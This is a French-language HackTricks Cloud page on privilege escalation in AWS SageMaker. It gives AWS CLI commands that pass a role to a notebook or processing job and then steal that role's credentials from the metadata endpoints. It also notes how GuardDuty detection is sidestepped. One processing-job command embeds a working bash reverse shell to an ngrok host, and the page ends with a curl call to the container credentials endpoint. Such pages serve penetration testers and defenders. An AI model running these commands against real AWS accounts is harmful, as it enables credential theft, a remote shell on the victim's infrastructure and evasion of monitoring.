# AWS - Sagemaker Privesc

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## sagemaker

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

La premi√®re √©tape de ce processus d'attaque consiste √† **identifier un r√¥le qui fait confiance √† SageMaker pour l'assumer** (sagemaker.amazonaws.com). Une fois cela fait, nous pouvons ex√©cuter la commande suivante pour cr√©er un nouveau notebook avec ce r√¥le attach√© :

```
aws sagemaker create-notebook-instance --notebook-instance-name example \
    --instance-type ml.t2.medium \
    --role-arn arn:aws:iam::ACCOUNT-ID:role/service-role/AmazonSageMaker-ExecutionRole-xxxxxx
```

Si cela r√©ussit, vous recevrez l'**ARN de la nouvelle instance de notebook** dans la r√©ponse d'AWS. Cela prendra **quelques minutes** pour se mettre en place, mais une fois que cela est fait, nous pouvons ex√©cuter la commande suivante pour obtenir une URL pr√©-sign√©e pour acc√©der au notebook via notre navigateur web. Il existe potentiellement d'autres moyens d'acc√©der, mais c'est une seule autorisation et un seul appel d'API, donc cela semblait simple.

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

Si cette instance √©tait enti√®rement mise en place, cet appel d'API renverra une **URL sign√©e que nous pouvons visiter** dans notre navigateur pour acc√©der √† l'instance. Une fois sur la page Jupyter dans mon navigateur, je vais cliquer sur "Open JupyterLab" en haut √† droite, comme on peut le voir sur la capture d'√©cran suivante.

![](<../../../.gitbook/assets/image (15) (1).png>)

√Ä partir de la page suivante, faites d√©filer tout en bas de l'onglet "Launcher". Sous la section "Other", cliquez sur le bouton "Terminal", que l'on peut voir ici.

![](<../../../.gitbook/assets/image (27).png>)

√Ä partir du terminal, nous avons plusieurs options, dont l'une serait simplement d'**utiliser l'AWS CLI**. L'autre option serait de **contacter le service de m√©tadonn√©es EC2** pour les informations d'identification du r√¥le directement et les exfiltrer.

GuardDuty pourrait venir √† l'esprit en lisant "les exfiltrer" ci-dessus, cependant, nous n'avons pas vraiment besoin de nous soucier de GuardDuty ici. La d√©couverte de GuardDuty associ√©e est [¬´ UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration ¬ª](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_unauthorized.html#unauthorized11), qui alertera si les informations d'identification d'un r√¥le sont vol√©es depuis une instance EC2 et utilis√©es ailleurs. Heureusement pour nous, cette instance EC2 ne vit pas r√©ellement dans notre compte, mais c'est plut√¥t une **instance EC2 g√©r√©e h√©berg√©e dans un compte AWS d√©tenu**. Cela signifie que **nous pouvons exfiltrer ces informations d'identification et ne pas nous soucier de d√©clencher** les d√©tecteurs GuardDuty de notre cible.

**Impact potentiel :** Privesc vers le r√¥le de service sagemaker sp√©cifi√©.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

De mani√®re similaire √† l'exemple pr√©c√©dent, si des **notebooks Jupyter sont d√©j√† en cours d'ex√©cution** et que vous pouvez les lister avec sagemaker:ListNotebookInstances (ou les d√©couvrir de toute autre mani√®re), vous pouvez **g√©n√©rer une URL pour eux, y acc√©der et voler les informations d'identification comme indiqu√© dans la technique pr√©c√©dente**.

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

**Impact potentiel :** Privesc vers le r√¥le de service sagemaker attach√©.

### `sagemaker:CreateProcessingJob,iam:PassRole`

Un attaquant disposant de ces autorisations peut faire **ex√©cuter √† sagemaker un job de traitement** avec un r√¥le sagemaker attach√©. L'attaquant peut indiquer la d√©finition du conteneur qui sera ex√©cut√© dans une **instance de compte ECS g√©r√©e par AWS**, et **voler les informations d'identification du r√¥le IAM attach√©**.

```bash
# J'ai t√©l√©charg√© une image Docker python sur l'ECR
aws sagemaker create-processing-job \
    --processing-job-name privescjob \
    --processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
    --app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
    --role-arn <sagemaker-arn-role>

# Dans mes tests, cela a pris 10 minutes pour recevoir le shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #